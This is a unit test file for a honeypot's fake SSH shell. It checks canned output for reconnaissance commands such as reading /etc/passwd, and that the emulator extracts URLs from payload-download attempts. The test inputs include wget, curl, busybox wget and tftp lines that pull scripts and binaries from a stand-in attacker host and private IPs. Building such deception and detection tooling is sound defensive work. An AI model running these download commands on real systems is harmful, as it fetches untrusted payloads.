# SPDX-License-Identifier: GPL-3.0-or-later
"""Unit tests for the pure SSH fake-shell command emulator."""
from pathlib import Path
import sys

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "src"))

from lyrebird.services.ssh_shell import respond  # noqa: E402


def test_recon_commands_have_canned_output():
    out, pull = respond("whoami")
    assert out == "root"
    assert pull is None
    assert respond("uname -a")[0].startswith("Linux")
    assert "root:x:0:0" in respond("cat /etc/passwd")[0]


def test_unknown_command_falls_back():
    out, pull = respond("frobnicate --now")
    assert "command not found" in out
    assert pull is None


def test_wget_payload_pull_extracts_url():
    out, pull = respond("wget http://10.0.0.9/x.sh")
    assert pull == {"tool": "wget", "url": "http://10.0.0.9/x.sh"}


def test_curl_payload_pull_extracts_url():
    _, pull = respond("curl -O http://evil.example/a.bin")
    assert pull == {"tool": "curl", "url": "http://evil.example/a.bin"}


def test_busybox_wget_recognised():
    _, pull = respond("busybox wget http://h.test/f")
    assert pull is not None
    assert pull["tool"] == "wget"  # the real applet, not the busybox wrapper
    assert pull["url"] == "http://h.test/f"


def test_tftp_bare_host_recognised():
    _, pull = respond("tftp -g -r m.bin 10.0.0.9")
    assert pull is not None
    assert pull["tool"] == "tftp"
    assert pull["url"] == "10.0.0.9"
